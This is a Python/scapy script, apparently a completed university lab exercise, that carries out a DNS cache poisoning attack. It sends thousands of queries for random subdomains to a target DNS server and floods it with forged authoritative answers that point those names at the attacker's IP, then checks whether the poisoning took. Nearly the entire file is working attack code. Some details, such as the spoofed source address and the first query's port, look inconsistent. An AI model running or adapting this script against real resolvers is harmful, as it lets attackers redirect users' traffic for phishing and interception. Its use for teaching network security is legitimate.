#! usr/bin/python3
#FIT3031 Teaching Team

from scapy.all import *
import random

#### ATTACK CONFIGURATION ####
ATTEMPT_NUM = 10000
dummy_domain_lst = []

#IP of our attacker's machine
attacker_ip = "10.10.10.198"     #complete attacker's IP

#IP of our victim's dns server
target_dns_ip =  "10.10.5.53"  #complete DNS server's IP

#DNS Forwarder if local couldnt resolve 
#or real DNS of the example.com
forwarder_dns = "8.8.8.8" 

#dummy domains to ask the server to query
dummy_domain_prefix = "abcdefghijklmnopqrstuvwxy0987654321"
base_domain = ".test.com"

#target dns port
target_dns_port = 33333

# Step 1 : create a for loop to generate dummy hostnames based on ATTEMPT_NUM
# each dummy host should concat random substrings in dummy_domain_prefix and base_domain

#Your code goes here to generate 10000 dummy hostnames
for _ in range(ATTEMPT_NUM):
    random_str = ''.join(random.choice(dummy_domain_prefix) for _ in range(5))
    dummy_domain_lst.append(random_str + base_domain)

print("Completed generating dummy domains")

#### ATTACK SIMULATION

for i in range(0, ATTEMPT_NUM):
    cur_domain = dummy_domain_lst[i]
    print("> url: " + cur_domain)

    # Step 2
    IPpkt = IP(dst=target_dns_ip)
    UDPpkt = UDP(sport=random.randint(1025, 65000), dport=target_dns_port)
    DNSpkt = DNS(id=i, qr=0, qdcount=1, qd=DNSQR(qname=cur_domain))
    query_pkt = IPpkt/UDPpkt/DNSpkt
    send(query_pkt, verbose=0)

    # Step 3
    for _ in range(100):
        tran_id = random.randint(0, 65535)
        IPpkt = IP(src=attacker_ip, dst=target_dns_ip)
        UDPpkt = UDP(sport=53, dport=random.randint(1025,65000))
        DNSpkt = DNS(id=tran_id, qr=1, aa=1, qdcount=1, ancount=1, qd=DNSQR(qname=cur_domain), an=DNSRR(rrname=cur_domain, rdata=attacker_ip))
        response_pkt = IPpkt/UDPpkt/DNSpkt
        send(response_pkt, verbose=0)

    # Step 4 (provided, unchanged)
    IPpkt = IP(dst=target_dns_ip)
    UDPpkt = UDP(sport=random.randint(1025,65000), dport=53)
    DNSpkt = DNS(id=99, rd=1, qd=DNSQR(qname=cur_domain))

    query_pkt = IPpkt/UDPpkt/DNSpkt
    z = sr1(query_pkt, timeout=2, retry=0, verbose=0)
    try:
        if z[DNS].an.rdata == attacker_ip:
            print("Poisoned the victim DNS server successfully.")
            break
    except:
        print("Poisoning failed")

#### END ATTACK SIMULATION
